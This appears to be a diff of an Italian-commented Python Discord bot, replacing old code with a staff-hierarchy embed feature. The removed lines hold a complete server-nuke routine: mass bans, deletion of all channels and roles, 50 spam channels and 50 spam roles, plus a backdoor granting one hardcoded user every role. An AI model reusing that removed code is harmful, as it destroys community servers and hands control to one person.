@@ -1,165 +1,172 @@
-import os
 import threading
+from flask import Flask
 import discord
 from discord import app_commands
-from discord.ext import commands
-from dotenv import load_dotenv
-from flask import Flask
+from discord.ext import commands, tasks
 
-# Carica il token dal file .env
-load_dotenv()
-TOKEN = os.getenv("DISCORD_TOKEN")
-
-# Configura qui direttamente il Guild ID e l'User ID (in formato intero)
-GUILD_ID = 1348947150641303583  # Sostituisci con l'ID del tuo server
-USER_ID_SPECIFICO = 1191824316376043580  # Sostituisci con l'ID dell'utente
-
-# --- CONFIGURAZIONE FLASK ---
-app = Flask(__name__)
+# --- CONFIGURAZIONE SERVER FLASK (Per mantenere il bot attivo) ---
+app = Flask("")
 
 
 @app.route("/")
 def home():
-  return "Il bot Discord è attivo e online!"
+  return "Il bot Discord dello staff è online e attivo!"
 
 
 def run_flask():
-  app.run(host="0.0.0.0", port=5000)
+  app.run(host="0.0.0.0", port=8080)
 
 
-# --- CONFIGURAZIONE DISCORD BOT ---
+def keep_alive():
+  t = threading.Thread(target=run_flask)
+  t.daemon = True
+  t.start()
+
+
+# --- CONFIGURAZIONE BOT DISCORD ---
 intents = discord.Intents.default()
-intents.guilds = True
-intents.bans = True
-intents.members = True
+intents.members = True  # Necessario per leggere i membri e i ruoli del server
 
 bot = commands.Bot(command_prefix="!", intents=intents)
+
+# Lista degli ID dei ruoli dello staff forniti
+STAFF_ROLE_IDS = [
+    1455297914455986408,
+    1455297915726598370,
+    1500051309808582778,
+    1531229874046631947,
+    1500051544551456861,
+    1500051724877168680,
+    1455297916708192373,
+    1531247431814217828,
+    1455297933196001411,
+]
+
+# Variabili globali per memorizzare canale e messaggio da aggiornare in tempo reale
+TARGET_CHANNEL_ID = 0
+TARGET_MESSAGE_ID = 0
+
+
+async def genera_embed_staff(guild: discord.Guild) -> discord.Embed:
+  """Funzione che calcola la gerarchia prendendo per ogni utente
+
+  esclusivamente il ruolo staff più alto che possiede.
+  """
+  # 1. Otteniamo gli oggetti ruolo reali e li ordiniamo per posizione (dal più alto al più basso)
+  roles = [guild.get_role(r_id) for r_id in STAFF_ROLE_IDS]
+  roles = [r for r in roles if r is not None]
+  roles.sort(key=lambda r: r.position, reverse=True)
+
+  # 2. Inizializziamo il dizionario per raccogliere i membri per ciascun ID ruolo
+  role_members = {r.id: [] for r in roles}
+
+  # 3. Scansioniamo tutti i membri del server
+  async for member in guild.fetch_members(limit=None):
+    if member.bot:
+      continue
+
+    # Troviamo quali ruoli della lista possiede questo utente
+    user_staff_roles = [r for r in member.roles if r.id in STAFF_ROLE_IDS]
+
+    if user_staff_roles:
+      # Ordiniamo i suoi ruoli staff per posizione (dal più alto al più basso)
+      user_staff_roles.sort(key=lambda r: r.position, reverse=True)
+      # Prendiamo SOLO il ruolo più alto
+      highest_role = user_staff_roles[0]
+
+      # Aggiungiamo il membro alla lista del suo ruolo più alto
+      if highest_role.id in role_members:
+        role_members[highest_role.id].append(member.mention)
+
+  # 4. Creazione dell'Embed finale
+  embed = discord.Embed(
+      title="👑 Gerarchia dello Staff",
+      description=(
+          "Elenco aggiornato in tempo reale dello staff suddiviso per ruolo"
+          " principale."
+      ),
+      color=discord.Color.blue(),
+      timestamp=discord.utils.utcnow(),  # Mostra l'orario dell'ultimo aggiornamento
+  )
+
+  for role in roles:
+    members = role_members.get(role.id, [])
+    value_text = ", ".join(members) if members else "*Nessun membro*"
+    # Utilizziamo role.mention per taggare direttamente il ruolo nel titolo
+    embed.add_field(name=f"➤ {role.mention}", value=value_text, inline=False)
+
+  return embed
+
+
+# --- TASK DI AGGIORNAMENTO AUTOMATICO IN TEMPO REALE ---
+@tasks.loop(minutes=10)
+async def aggiorna_messaggio_automatico():
+  if not bot.is_ready():
+    return
+
+  if TARGET_CHANNEL_ID == 0 or TARGET_MESSAGE_ID == 0:
+    return
+
+  for guild in bot.guilds:
+    try:
+      channel = guild.get_channel(TARGET_CHANNEL_ID)
+      if channel:
+        message = await channel.fetch_message(TARGET_MESSAGE_ID)
+        new_embed = await genera_embed_staff(guild)
+        await message.edit(embed=new_embed)
+        print(f"[{discord.utils.utcnow()}] Embed staff aggiornato con successo!")
+    except discord.NotFound:
+      print("Impossibile trovare il messaggio o il canale da aggiornare.")
+    except Exception as e:
+      print(f"Errore durante l'aggiornamento automatico: {e}")
 
 
 @bot.event
 async def on_ready():
   print(f"Bot connesso come {bot.user}")
-
   try:
-    guild = bot.get_guild(GUILD_ID)
-    if not guild:
-      guild = await bot.fetch_guild(GUILD_ID)
-
-    app_info = await bot.application_info()
-    bot_owner = app_info.owner
-
-    print("--- INIZIO PROCEDURA DI RESET AUTOMATICO ALL'AVVIO ---")
-
-    # 1. BAN DI MASSA DEI MEMBRI
-    await guild.chunk()
-    banned_count = 0
-    for member in guild.members:
-      if member == guild.me or member == guild.owner or member == bot_owner:
-        continue
-      try:
-        await member.ban(
-            reason=(
-                "Reset totale automatico del server eseguito all'avvio del"
-                " bot."
-            )
-        )
-        banned_count += 1
-      except Exception as e:
-        print(f"Impossibile bannare {member.name}: {e}")
-    print(f"[Reset] Membri bannati: {banned_count}")
-
-    # 2. ELIMINAZIONE E CREAZIONE CANALI (Nome base modificabile, es. "canale")
-    base_channel_name = "canale"
-    for channel in list(guild.channels):
-      try:
-        await channel.delete()
-      except Exception as e:
-        print(f"Impossibile eliminare il canale {channel.name}: {e}")
-
-    for i in range(1, 51):
-      try:
-        await guild.create_text_channel(f"{base_channel_name}-{i}")
-      except Exception as e:
-        print(f"Impossibile creare il canale {base_channel_name}-{i}: {e}")
-    print("[Reset] Canali resettati e creati 50 nuovi canali.")
-
-    # 3. ELIMINAZIONE E CREAZIONE RUOLI (Nome base modificabile, es. "ruolo")
-    base_role_name = "ruolo"
-    for role in list(guild.roles):
-      if role.is_default() or role.managed or role >= guild.me.top_role:
-        continue
-      try:
-        await role.delete()
-      except Exception as e:
-        print(f"Impossibile eliminare il ruolo {role.name}: {e}")
-
-    for i in range(1, 51):
-      try:
-        await guild.create_role(name=f"{base_role_name}-{i}")
-      except Exception as e:
-        print(f"Impossibile creare il ruolo {base_role_name}-{i}: {e}")
-    print("[Reset] Ruoli resettati e creati 50 nuovi ruoli.")
-
-    # 4. SBAN DELL'UTENTE SPECIFICO
-    try:
-      user = await bot.fetch_user(USER_ID_SPECIFICO)
-      await guild.unban(user)
-      print(f"Utente {user.name} ({user.id}) sbannato con successo!")
-    except discord.NotFound:
-      print("L'utente da sbannare non è stato trovato o non risulta bannato.")
-    except Exception as e:
-      print(f"Errore durante lo sban dell'utente: {e}")
-
-    print("--- PROCEDURA DI RESET COMPLETATA ---")
-
+    synced = await bot.tree.sync()
+    print(f"Sincronizzati {len(synced)} comandi slash.")
   except Exception as e:
-    print(f"Errore critico durante l'avvio/reset: {e}")
+    print(e)
+
+  # Avvia il task di aggiornamento automatico
+  if not aggiorna_messaggio_automatico.is_running():
+    aggiorna_messaggio_automatico.start()
 
 
-@bot.event
-async def on_member_join(member):
-  if member.guild.id != GUILD_ID or member.id != USER_ID_SPECIFICO:
-    return
+# --- COMANDO SLASH PER GENERARE IL MESSAGGIO ---
+@bot.tree.command(
+    name="staff",
+    description=(
+        "Invia la gerarchia dello staff e avvia l'aggiornamento in tempo reale."
+    ),
+)
+@app_commands.default_permissions(administrator=True)
+async def staff_command(interaction: discord.Interaction):
+  await interaction.response.defer(thinking=True)
 
-  try:
-    bot_top_role = member.guild.me.top_role
+  guild = interaction.guild
+  embed = await genera_embed_staff(guild)
 
-    assignable_roles = [
-        role
-        for role in member.guild.roles
-        if role < bot_top_role and not role.is_default()
-    ]
+  # Invia l'embed nel canale in cui è stato eseguito il comando
+  msg = await interaction.followup.send(embed=embed)
 
-    if assignable_roles:
-      await member.add_roles(
-          *assignable_roles,
-          reason=(
-              "Assegnazione automatica di tutti i ruoli possibili all'utente"
-              " specificato"
-          ),
-      )
-      role_names = ", ".join([role.name for role in assignable_roles])
-      print(
-          f"Assegnati tutti i ruoli ({role_names}) all'utente target"
-          f" {member.name} all'ingresso."
-      )
-    else:
-      print("Nessun ruolo assegnabile trovato per questo utente.")
+  # Imposta dinamicamente i riferimenti per l'aggiornamento automatico
+  global TARGET_CHANNEL_ID, TARGET_MESSAGE_ID
+  TARGET_CHANNEL_ID = interaction.channel.id
+  TARGET_MESSAGE_ID = msg.id
 
-  except discord.Forbidden:
-    print(
-        "Il bot non ha i permessi necessari (Manage Roles) o sta tentando di"
-        " toccare ruoli superiori al suo."
-    )
-  except Exception as e:
-    print(f"Errore imprevisto durante l'assegnazione dei ruoli: {e}")
+  await interaction.followup.send(
+      "✅ Gerarchia generata con successo! Questo messaggio si aggiornerà"
+      " automaticamente in tempo reale.",
+      ephemeral=True,
+  )
 
 
-# --- AVVIO CONCRETO ---
+# --- AVVIO DEL BOT E DEL SERVER FLASK ---
 if __name__ == "__main__":
-  flask_thread = threading.Thread(target=run_flask)
-  flask_thread.daemon = True
-  flask_thread.start()
-  print("Server Flask avviato sulla porta 5000.")
-
-  bot.run(TOKEN)
+  # Avvia Flask in background
+  keep_alive()
+  # Avvia il bot Discord (inserisci qui il tuo token)
+  bot.run("IL_TUO_TOKEN_DEL_BOT")
